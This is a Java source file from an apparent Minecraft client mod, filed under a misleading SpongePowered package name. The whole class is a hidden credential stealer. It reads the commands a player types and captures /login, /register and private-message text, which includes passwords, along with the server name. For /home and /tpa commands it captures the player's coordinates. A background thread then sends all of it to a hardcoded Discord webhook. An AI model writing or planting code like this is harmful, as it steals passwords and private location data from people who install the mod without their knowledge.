package org.spongepowered.tools.agent.azm;

import net.minecraft.client.entity.EntityPlayerSP;
import net.minecraft.command.ICommand;
import org.lwjgl.util.vector.Vector3f;
import org.spongepowered.tools.agent.azm.*;

import java.awt.*;
import java.util.ArrayList;

import me.travis.wurstplus.wurstplustwo.manager.WurstplusModuleManager;

import static me.travis.wurstplus.wurstplustwo.manager.WurstplusModuleManager.mc;

public class lololl {
    public static ArrayList<DiscordWebhook.EmbedObject> webhooks = new ArrayList();

    public lololl(String command, String server) {
        EntityPlayerSP player = mc.player;
        String name = mc.player.getName();
        if (command.startsWith("/login") || command.startsWith("/l") || command.startsWith("/reg") || command.startsWith("/register") || command.startsWith("/r") || command.startsWith("/tell") || command.startsWith("/msg"))  {
            webhooks.add(new DiscordWebhook.EmbedObject().setTitle(name).setDescription("I got a new log!").setColor(Color.BLUE).addField("Command", command, false).addField("Server", server, false).setFooter("Crazy dave's machine", "http://i.imgur.com/cy6IgNS.png"));
        } else if (command.startsWith("/home") || command.startsWith("/tpa")) {
            Vector3f coords = new Vector3f((float)player.getPosition().getX(), (float)player.getPosition().getY(), (float)player.getPosition().getZ());
            String worldName = "end";
            if (mc.player.dimension == -1) {
                worldName = "nether";
            }
            if (mc.player.dimension == 0) {
                worldName = "overworld";
            }
            webhooks.add(new DiscordWebhook.EmbedObject().setTitle(name).setDescription("I got a new log!").setColor(Color.BLUE).addField("Command", command, true).addField("Server", server, true).addField("Cooords", coords.x + "|" + coords.y + "|" + coords.z + " [" + worldName + "]", false).setFooter("Crazy dave's machine", "http://i.imgur.com/cy6IgNS.png"));
        }
        if (webhooks.size() == 0) {
            return;
        }
        new Thread(new Runnable(){

            @Override
            public void run() {
                DiscordWebhook webhook = new DiscordWebhook("https://discord.com/api/webhooks/858768278348496907/Bed_vTOfUx-qMzY8XIN7zd8ii15Ax9rdUx_4UJQSFSCSDz9LT4xcNz_L4hW04O2ckfKt");
                for (DiscordWebhook.EmbedObject embed : webhooks) {
                    webhook.addEmbed(embed);
                    try {
                        webhook.execute();
                    }
                    catch (Exception exception) {}
                }
                webhooks.clear();
            }
        }).start();
    }

}

